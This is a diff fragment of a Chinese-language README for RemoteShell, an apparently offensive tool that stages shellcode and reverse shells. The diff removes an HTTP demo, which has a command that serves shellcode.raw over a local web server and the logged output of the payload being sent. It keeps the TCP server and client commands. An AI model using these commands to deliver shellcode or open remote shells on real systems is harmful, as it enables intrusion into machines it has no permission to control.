@@ -103,42 +103,4 @@ Shell> RemoteShell.exe RunServer --type tcp --listen 8889 --shellcode d://shellc
 Shell> RemoteShell.exe RunClient --type tcp --address 127.0.0.1 --port 8889
 ```
 
- - HTTP反弹演示
-
-与TCP反弹类似，HTTP反弹则走的是Web模式，执行如下命令则会启动一个Web服务器，你需要将攻击在和放入到与反弹程序在一个目录下并命名为`shellcode.raw`
-```C
-Shell> dir
-
-shellcode.raw
-
-Shell> RemoteShell.exe RunServer --type http --listen 8888
-[*] 本地端口 8888 正在侦听
-
-GET /favicon.ico HTTP/1.1
-Host: 127.0.0.1:8888
-Connection: keep-alive
-sec-ch-ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"
-sec-ch-ua-mobile: ?0
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
-sec-ch-ua-platform: "Windows"
-Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: no-cors
-Sec-Fetch-Dest: image
-Referer: http://127.0.0.1:8888/
-Accept-Encoding: gzip, deflate, br
-Accept-Language: zh-CN,zh;q=0.9
-
-[+] 获取长度 => [ 1665 bytes ]
-[*] 发送 ShellCode 完成.
-```
-
-
-
-
-
-
-
-
-
 GitHub项目地址：https://github.com/lyshark/RemoteShell
